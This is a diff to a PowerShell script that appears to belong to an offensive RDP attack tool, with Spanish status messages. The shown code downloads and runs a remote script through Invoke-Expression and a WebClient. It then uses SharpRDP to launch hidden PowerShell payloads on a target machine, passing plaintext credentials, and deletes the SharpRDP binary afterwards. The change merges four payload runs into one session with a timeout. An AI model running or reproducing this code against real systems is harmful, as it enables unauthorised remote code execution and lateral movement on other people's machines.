@@ -357,14 +357,16 @@ function Remove-Exclusions {
         if(!(Test-RemoteTcp -Computer $computer -Port 3389 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 3389 (RDP) esta cerrado en ${computer}.. SharpRDP necesita el escritorio remoto activo" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')}
-        if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn4" }
-        if($user) { .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" }
+        Write-Host "[i] ${computer}: lanzando los payloads en 1 sola sesion RDP (SharpRDP, limite 45s).." -ForegroundColor DarkGray
+        $srcommand = "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4"
+        $srargs = 'computername=' + $computer + ' command="' + $srcommand + '"'
+        if($user){ $srargs = 'computername=' + $computer + ' username="' + $user + '" password="' + $PlainTextPassword + '" command="' + $srcommand + '"' }
+        $srpsi = New-Object System.Diagnostics.ProcessStartInfo ; $srpsi.FileName = '.\SharpRDP.exe' ; $srpsi.Arguments = $srargs ; $srpsi.UseShellExecute = $false
+        try { $srproc = [System.Diagnostics.Process]::Start($srpsi)
+        if(!$srproc.WaitForExit(45000)){ $srproc.Kill() ; Write-Host "[!] SharpRDP sin respuesta en ${computer} tras 45s.. cancelado. Prueba otra vez o usa otro ataque" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
+        elseif($srproc.ExitCode -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green }
+        else { Write-Host "[!] SharpRDP termino con codigo $($srproc.ExitCode)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } }
+        catch { Write-Host "[!] No se pudo lanzar SharpRDP: $($_.Exception.Message)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
         del .\SharpRDP.exe 2>&1> $null }
         
         'M' { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $mem_computer" -ForegroundColor DarkGray }
